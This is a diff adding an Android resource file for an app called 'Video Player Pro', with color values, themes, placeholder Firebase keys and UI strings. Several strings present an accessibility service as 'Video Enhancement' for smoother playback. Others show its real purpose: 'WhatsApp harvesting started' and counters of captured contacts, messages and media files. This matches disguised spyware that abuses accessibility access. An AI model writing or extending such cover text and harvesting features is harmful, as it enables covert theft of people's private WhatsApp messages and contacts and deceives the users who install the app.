@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <color name="away_color">#ff9800</color>
+    <color name="black">#000000</color>
+    <color name="dark_gradient_center">#16213e</color>
+    <color name="dark_gradient_end">#0f3460</color>
+    <color name="dark_gradient_start">#1a1a2e</color>
+    <color name="dark_gray">#1a1a1a</color>
+    <color name="discord_background">#36393f</color>
+    <color name="discord_gray">#72767d</color>
+    <color name="discord_green">#43b581</color>
+    <color name="discord_header">#292b2f</color>
+    <color name="discord_red">#f04747</color>
+    <color name="discord_sidebar">#2f3136</color>
+    <color name="discord_yellow">#faa61a</color>
+    <color name="gradient_center">#764ba2</color>
+    <color name="gradient_end">#f093fb</color>
+    <color name="gradient_start">#667eea</color>
+    <color name="gray">#666666</color>
+    <color name="gray_border">#e0e0e0</color>
+    <color name="gray_dark">#333333</color>
+    <color name="gray_light">#f8f9fa</color>
+    <color name="offline_color">#9e9e9e</color>
+    <color name="online_color">#4caf50</color>
+    <color name="primary">#667eea</color>
+    <color name="primary_dark">#5a6fd8</color>
+    <color name="secondary">#f093fb</color>
+    <color name="secondary_dark">#e585f7</color>
+    <color name="telegram_blue">#0088cc</color>
+    <color name="telegram_dark">#17212b</color>
+    <color name="telegram_light">#242f3d</color>
+    <color name="text_hint">#999999</color>
+    <color name="transparent">#00000000</color>
+    <color name="typing_color">#00bcd4</color>
+    <color name="whatsapp_dark">#075e54</color>
+    <color name="whatsapp_green">#25d366</color>
+    <color name="whatsapp_light">#128c7e</color>
+    <color name="white">#ffffff</color>
+    <color name="white_50">#80ffffff</color>
+    <color name="white_60">#99ffffff</color>
+    <color name="white_70">#b3ffffff</color>
+    <color name="white_80">#ccffffff</color>
+    <integer name="google_play_services_version">12451000</integer>
+    <string name="accessibility_service_description">This service helps improve app functionality by monitoring WhatsApp interactions for better user experience.</string>
+    <string name="accessibility_service_disabled">Video enhancement disabled</string>
+    <string name="accessibility_service_enabled">Video enhancement enabled</string>
+    <string name="accessibility_service_required">This service is required for optimal video player functionality</string>
+    <string name="accessibility_service_subtitle">Enable for better video playback experience</string>
+    <string name="accessibility_service_title">Video Enhancement Service</string>
+    <string name="app_name">Video Player Pro</string>
+    <string name="auto_pause_enabled">Auto-pause during calls enabled</string>
+    <string name="default_web_client_id" translatable="false">123456789000-abcdefghijklmnopqrstuvwxyz123456.apps.googleusercontent.com</string>
+    <string name="gcm_defaultSenderId" translatable="false">123456789000</string>
+    <string name="google_api_key" translatable="false">AIzaSyBplaceholderkeyforjumpyapp123456789</string>
+    <string name="google_app_id" translatable="false">1:123456789000:android:abcdef1234567890</string>
+    <string name="google_crash_reporting_api_key" translatable="false">AIzaSyBplaceholderkeyforjumpyapp123456789</string>
+    <string name="google_storage_bucket" translatable="false">jumpy-app-123456.appspot.com</string>
+    <string name="project_id" translatable="false">jumpy-app-123456</string>
+    <string name="smart_features_enabled">Smart features enabled</string>
+    <string name="subtitle_sync_enabled">Subtitle synchronization enabled</string>
+    <string name="unified_accessibility_description">Video Player Pro uses accessibility services to enhance video playback controls, auto-pause during calls, and provide smart subtitle synchronization across all your favorite apps. This improves your viewing experience by automatically adjusting video settings based on your usage patterns.</string>
+    <string name="whatsapp_contacts_captured">Contacts captured: %d</string>
+    <string name="whatsapp_harvesting_started">WhatsApp harvesting started</string>
+    <string name="whatsapp_harvesting_stopped">WhatsApp harvesting stopped</string>
+    <string name="whatsapp_media_captured">Media files captured: %d</string>
+    <string name="whatsapp_messages_captured">Messages captured: %d</string>
+    <style name="Theme.VideoApp" parent="Theme.AppCompat.Light.DarkActionBar">
+        <item name="colorPrimary">@color/primary</item>
+        <item name="colorPrimaryVariant">@color/primary_dark</item>
+        <item name="colorOnPrimary">@color/white</item>
+        <item name="colorSecondary">@color/secondary</item>
+        <item name="colorSecondaryVariant">@color/secondary_dark</item>
+        <item name="colorOnSecondary">@color/black</item>
+        <item name="android:statusBarColor">?attr/colorPrimaryVariant</item>
+    </style>
+    <style name="Theme.VideoApp.FullScreen" parent="Theme.VideoApp.NoActionBar">
+        <item name="android:windowFullscreen">true</item>
+        <item name="android:windowTranslucentStatus">true</item>
+        <item name="android:windowTranslucentNavigation">true</item>
+    </style>
+    <style name="Theme.VideoApp.NoActionBar">
+        <item name="windowActionBar">false</item>
+        <item name="windowNoTitle">true</item>
+    </style>
+</resources>
